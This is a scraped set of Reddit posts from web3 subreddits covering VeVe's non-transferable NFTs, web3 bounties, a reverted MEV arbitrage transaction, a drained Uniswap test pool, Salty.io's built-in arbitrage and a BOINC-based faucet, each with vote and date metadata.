Marvel and Disney NFTs Promising True Ownership Still Trapped in VeVe's Walled Garden,"hey everyone, so i’ve been following the whole marvel & disney nft thing on veve for a while, and i think a lot of people might not realize what’s really going on here. when these nfts first dropped, the hype was all about *owning* digital collectibles from these massive brands, right? but here’s the catch—those nfts are stuck inside veve's platform with no way to transfer them out. basically, veve operates like a walled garden. you can buy, sell, within the app, but there’s no option to move your nfts to an open wallet or another marketplace. this kinda goes against the whole point of nfts being decentralized and giving you control of your assets. a lot of people who bought in early thought they'd eventually be able to transfer their marvel or disney nfts to other platforms, but nope still locked in. what’s worse is veve hasn’t really been clear about this from the start. there’s been a lot of frustration in the community. i mean, these are big brands with a lot of trust behind them, so collectors are understandably pissed that they don’t really “own” the nfts the way they expected. so yeah, just something to keep in mind if you're looking into veve. until they allow transfers or give more transparency, your nfts are pretty much stuck on their app. what’s everyone thoughts on this?",10,7,0.81,2024-09-13 17:00:56,web3,NFT,[deleted],False,16.900000000000002

What are web3 Bounties? and how to get started,"bounties in web3 have become a massive norm and engraved in web3 work culture. bounties are a permission less way for people to get started with working in web3. the talent supply in web3 is quite small in web3 compared to the demand from various web3 projects big and small. there are 100s of daos, 1000s of nft projects, 100s of defi projects and much more which all need people to work on them. also not all this projects can afford a full time developer, designer content writer, social media manager and community manager. so bounties have become a way for this projects to get the the necessary talents they need without the cost and risk of a full time hire. bounties have also been a way for skilled persons to really contribute at the forefront of web3, earn while also staying free and not answering to a boss. it has also become a low risk learning curve for people looking to make the transition from web2 to web3. tens of millions of dollars have been poured into bounties and the space seems to be growing and encompassing new opportunities. with this rise in popularity its becoming harder to stand out. #### why perform a bounty? a common argument against bounties is that, you don’t get compensated for performing the bounties *(you can earn nfts if you perform bounties listed on* [*voice*](http://www.voicedao.fun/)*)* even if you did a good job but didn’t win. most bounties now are giving out compensations for the top three. 1. **to get a taste of what working in web3 feels like** there’s a notable difference when working in web2 than in web3, the first this is the direct human relationships (which can serve as networking) you form when performing this bounties. while working on a bounty you familiarize yourself with the nitty gritty of web3, from the lingo, to the technology to the people. this can be valuable in the future. 2. **building your web3 reputation** a massive upside to performing bounties in web3 is the fact that you begin the process of building your reputation in web3 for when you maybe want to get a full time job in web3. every web3 project wants to know what your web3 experience is when you are applying, saying you have performed multiple bounties (*and having the* [*nfts to prove it* ](http://www.voicedao.fun/)) goes a long way. 3. **you earn nft badges for the work you do** this is a self plug :p but lets be honest earning [nft badges](https://www.voicedao.fun/bounties) that prove you did a particular high quality task in the nft space is valuable for both building a reputation and having a viable web3 work history. if you perform any of the [100s of active bounties](https://www.voicedao.fun/bounties) or [freelance gigs](https://www.voicedao.fun/freelance) listed on voice and submit your work for an nft badge, we’ll review it for quality (just to make sure people aren’t just submitting low quality work for nfts) then mint an nft badge for you with your address and title of the the work you did, then send it to you all for free. this way you are building up your project base and anyone who views your collection has an idea of what you’re good at. check out voice here: [https://www.voicedao.fun](https://www.voicedao.fun/job-details?recordid=rec4wxvhv95ainmwt)/ end of the self plug, thanks for reading :p **4. get hired** an effective way to get hired without going through the application process is to perform such a bounty so impressively that the project decides to hire you. there’s very little loss on your side but the upside is massive. #### how to get started with bounties 1. **use a bounty board** bounties are spread all over the web and the best way to get started is going for a [bounty board](http://www.voicedao.fun/) as it is a collated board of bounties from every bounty across the web. [layer3](http://layer3.xyz/) and [voicedao](http://www.voicedao.fun/) are the best in terms of bounties listed for every type of skill from writing to development to design etc they got it. **2. choose a bounty that fits your skill** go through the bounties listed and choose a bounty that fits into what you can do and pays considerably well, in context with the work you’ll put in. **3. digest the task, write an outline and try to reach out to the team** just as the step says, digest the task write an outline and try to reach out to the team. once you choose a task, really try to understand the task then write a sort of outline (or summary) then attempt reaching out to the team to see if you can show them what you got, just to confirm you’re on track **4. do it and submit** perform the task and submit it, you’ll definitely not be the only one who did the task but you definitely have got a shot. if you got the bounty off [voice](http://www.voicedao.fun/bounties), submit your work so you can receive an nft badge for the work done. thanks for reading, if you want to go full time web3 check out voice: [https://www.voicedao.fun/](https://www.voicedao.fun/)",12,1,0.93,2022-04-16 14:53:53,web3,web3,Mk_Makanaki,False,16.9

What's keeping Web3 from attracting influencers and artist communities?,"this new token economy provides content creators with unrivalled opportunities. for the past few months, passionate debates have raged across the internet about what is at stake for the internet's future. web3, as the project is known, proposes a decentralised internet as a ""internet of blockchains."" web3 aims to end the dominance of the big platforms that have essentially come to run our lives, based on existing inequitable power structures that ultimately take ownership and empowerment away from users (despite web2 being characterised by mass user-generated content). the creator economy is the clearest example of this in internet culture. the creator economy, now worth $104.2 billion, is largely a result of web2. whether you're a self-taught make-up artist or an mmorpg fan, your passions could become very real careers in a time when content is king and demand is high. even large corporations, such as elite of italy, have entered the market with their elisium project, which connects influencers with cryptocurrency. what are your thoughts on this?",12,2,0.89,2022-04-21 13:43:28,web3,web3,Cora_dn,False,16.9

Ethereum Arbitrage Transaction Reverted but Still Included in Block - Seeking Advice,"i’ve run into a perplexing issue with my ethereum arbitrage transactions, and i’m hoping to get some insights from the community. currently, i’m executing arbitrage strategies by sending transactions through flashbots bundles directly to private nodes (such as beaverbuild.org). recently, i encountered a situation where one of my arbitrage orders, which was supposed to be handled exclusively by private nodes, reverted but still got included in the blockchain. here’s the setup: i use an increased gas price to pay the bribe, meaning that even if the transaction reverts, the node still receives some compensation. my understanding was that if a transaction reverts, it should not be included in a block, especially when using private nodes for mev purposes. however, contrary to this assumption, a reverted transaction was still included on-chain, and i’m trying to figure out why. my questions are: 1 . is this a configuration issue with the node operator, or is it something that can occur when using flashbots to send bundles? 2 . what strategies can i implement to avoid this situation? should i add extra validation logic in my contract? has anyone else experienced similar issues, particularly when using [beaverbuild.org](http://beaverbuild.org) or other similar nodes?",8,5,1.0,2024-08-25 06:50:37,web3,ethdev,Party_Strength9220,False,16.8

Do nodes actually sign a transaction?,hello redditors! i'm reading a book on blockchain called - mastering blockchain by imran bashir. in the beginning it mentions parts of the blockchain and more precisely types of nodes. it states that there are two types of nodes - *miners* and *block signers.* i was left with the impression that the wallet signs a transaction but in the book when it explains in depth it states that: >a node starts a transaction by first creating it and then digitally signing it with its private key. do nodes have private keys? can someone elaborate more in depth about the flow. thanks in advance! &#x200b;,8,9,0.84,2024-01-18 07:07:29,web3,CryptoTechnology,eo_oe,False,16.8

Uniswap v2 Anomaly: Bot buys 99% of token supply for nearly nothing after liquidity drain,"i've encountered a situation with my test token that i can't understand. i have a token called cmb on the base network at address 0xb16274a0882fa01f921c5f9141e389ee747f803f with a supply of 100 million and a uniswap v2 pool with an initial liquidity of 1000 tokens and 0.01 eth. i used this token for various tests, and half of the lp tokens are burned across different addresses. since i had many tokens outside the pool, when i finished my experiments, i dumped 99.998% of the tokens into the pool and withdrew 0.08349 eth that remained in the pool after the experiments. now i needed to run some tests again, and i noticed that someone's bot managed to buy 99% of the supply for just 0.00002800 eth in the transaction immediately following mine. as far as i've seen before, the pool usually works like a scale - if there are two consecutive buy-sell transactions for the same amount of tokens, the eth amount should be the same. it looks like when the eth value in the pool is very close to zero, something weird happens with the first buy transaction.

Overcoming The Technical Challenges of Atomic Arbitrage within DEX Swap Transactions,"i've been building a novel ethereum dex over the last year that incorporates a feature known as automatic atomic arbitrage (aaa), called [salty.io](https://salty.io). the core idea is to enable arbitrage within the same blockchain transaction as a user's trade to negate inefficiencies like front-running and mev. achieving this required ensuring the entire process, including the user swap and arbitrage search and execution, used less than 100k gas. my feeling is that the mechanic of keeping arbitrage profits within protocols themselves (rather than extracted by external arbitrage bots) would be a useful one for a variety of projects and i wanted to discuss the technical specifics of how i did it. * the limitations of forking existing amm codebases required starting from scratch. the pool reserves contract for the dex is unified and allows multiple swaps to occur within a single contract without have to make external calls to other contracts. this allows the user swap and arbitrage swaps to adjust the reserves efficiently within a single contract. i would expect that the core components of most projects would need to be similarly rewritten to benefit from something like aaa. of course, for layer 2s with minimal gas costs, such optimizations might not be as necessary. * as searching for the arbitrage paths is done within the same transaction as the user swap, gas use needed to be kept at a minimum as well. the mechanism used is a compromise which searches a finite number of arbitrage paths. specifically for [salty.io](https://salty.io) all tokens are paired with weth on the dex, so anytime a user swaps a pair of tokens, one of the paths below can be used. i suspect that other projects adopting something like aaa would need to make project specific compromises as well. |userswap|arbitrage path| |:-|:-| |wbtc->weth|weth->wbtc->salt->weth| |weth->wbtc|weth->salt->wbtc->weth| |weth->token|weth->wbtc->token->weth| |token->weth|weth->token->wbtc->weth| |token1->token2|weth->token2->token1->weth| &#x200b; * once the path of the arbitrage is determined, bisection search (a variant of binary search) is used to find the optimal amountin of weth for the arbitrage trade. the bisection search assumes the profit function of arbitrage is unimodal (which has been simulated to be true). as such there is one optimum for amountin and allows cutting the search space in hald on each iteration. each loop of the bisection search uses 492 gas and there are 8 iterations of of the search. this type of search would probably be generally useful in other projects as well. &#x200b; code for the arbitrage and bisection search can be found here: [https://github.com/othernet-global/salty-io/blob/main/src/arbitrage/arbitragesearch.sol](https://github.com/othernet-global/salty-io/blob/main/src/arbitrage/arbitragesearch.sol) technical overview of the arbitrage process: [https://tech.salty.io/technical-details/arbitrage](https://tech.salty.io/technical-details/arbitrage) looking forward to discussion about the current state of the art in terms of onchain arbitrage built into protocol transactions.",8,5,1.0,2024-01-15 21:48:08,web3,ethdev,danielcota,False,16.8

"I made a new faucet design which helps avoid ""faucet addiction""","using a blockchain's cool new tech requires you to have tokens of some kind of interact with it. but new users don't have tokens. to solve this, many crypto projects make a faucet to give users small amounts of starter coins. the problem is that any given user may come back more than once (""faucet addiction"") and while you can discourage this with time delays, captchas, and other techniques, it will not prevent it entirely. eventually you are left in a race between the value of the coins the faucet dispenses and how much somebody values their time or the difficulty to obtain the coins. so i set out to solve this problem with a new faucet design. this new faucet is a ""proof of work"" faucet. first we figure out how much work would typically need to be done to earn x amount of coins with normal mining, then we make sure the amount of work we require to be done to use the faucet is above that amount. and unlike hashes, which are boring and *so* 2014, this uses credits from boinc projects. boinc is a permissionless network which uses the computers of volunteers to crunch data for scientific researchers. there are projects ranging from medical research to finding pulsars. the large hadron collider even has a project. and there is a crypto project (gridcoin) which rewards boinc participation, so we have a ""ruler"" to establish how much boinc computation it takes to earn $x usd in coins. the faucet is one time use and bans the user id/cpid after the first use. **importantly, the amount of work required means that a person would make more coins mining normally than creating new accounts for the sole purpose of using the faucet, so there is is a disincentive to use the faucet multiple times**. right now, this faucet only works for gridcoin, but it could easily be extended to support any other coin where a relationship of value can be established between grc and that coin. it connects to the gridcoin wallet via the same web rpc that bitcoin's wallet uses. the faucet pulls boinc stats from world community grid and nfs@home (but again, can be used with any other boinc project you just need to make a few minor changes). making all those customizations could be done in less than 20 lines of code, and examples are provided for you to do it. it's written in python and open source, you are free to use it on your project, i hope some other people find it useful. it can be a cool way to **get starter coins for your users** (especially for blockchains which have no mining as an option) and **support scientific research** at the same time. it also doesn't require your users to install typical mining software via the command line or some other complex route, boinc is much easier to use.

The future of Web 3 Gaming,"* **heya! glad i made it here! i am looking into web 3 and have noticed the hype around web 3 gaming but i am having my question, being a gamer myself i feel like i have a pretty good idea what is going on in the gaming industry right now. my thought process is: for an innovation to be 'accepted' or rather used. for people to swap to somethin new, said innovation needs to actually 'innovate'. do something new that people want, or fix a problem people want fixed.** **so, what would be the biggest problem right now in the gaming industry? in my eyes, this is big companies not making games for gamers, but solely for making money, shareholder have a lot of influence on the development and push games out before they are ready, this would result in unfinished games who are not enjoyable for another half a year of patching. in the case of big games like mmo's this results in pay 2 win marketplaces and or patches/expansions that are underwhelming yet are necessary for progression. good examples of multiple new games of developers that used to put out quality material but are flopping now are: wow, diablo 4, cyberpunk2077, cod, payday, hell even bethesda is becoming this aswell. i could go on for hours honestly.** **so, if web 3 gaming is really the future, in what way can it solve these problems? thats the question i ask myself and i am curious as to what you guys think, because i am not sure.** **my take:** **- dao is interesting as in that it allows people to vote, vote for development descicions, this especially could be very interesting in online games like mmo's where updates to the game are crucial to the game's success. but my two problems with this are: dao is only for shareholders of the currency, so directly you relate influence to money. if you have more money, you have more influence. also the currency which you will vote with can go up and down in price and will depends on the companies' success rather than the games' success. so in short, pay to win will make the company more money, if used well this will make the company more successfull, driving up the price of the coin, thus having the exact same as what we already have. in my eyes making it almost identical to stocks in a way. the only difference being that anyone can vote, but ultimatly the big bags always kind of outvote the small ones. an i can tell you the big bag holders are not the ones playin the game lol, just like stockholders.** **also, osrs (old school runescape) is a good example where a voting system is already in place, a lot of big decisions are made through a voting system available for subscribed members. jagex will not develop if the community is not agreeing with them. thus osrs also has one of the healthiest communities out there, a beautiful example of a dedicated team of developers wanting whats best for the gamers. having said this, what is so revolutionairy about dao then? what will it change what isnt already possible?** **- and lets say we are looking at marketplaces of games like runescape or wow, what could blockchain technology add what isnt already there? what other benefits than a way to make money for players is there in the additions of blockchain technology to the gaming marketplaces and gaming communities? if anything, it will allow for even more pay to win right? or am i delusional on this one, making it possible to really own items in the game sounds cool, but then if you add actual irl money value to it will you not be able to just buy and sell items with irl money aswell. cant you just buy the best item as long as you have enough money? how will this improve anything? how is this sustaineble in a industry that is already struggling with a pay to win problem?** **last but not least, if i am completely missing the point, please let me know. if there are other factors that will set in stone the success of web 3 gaming i am super curious what this might be. is this something completely different? maybe energy or storage related, maybe scalability, let me know :)** * **i know this is a lot! i am just really curiours on your guy' takes on this. feel free to drop any opinion, i am new to all this and would love to get educated**",5,13,0.86,2024-04-16 09:37:40,web3,web3,Odd_Report_110,False,16.799999999999997
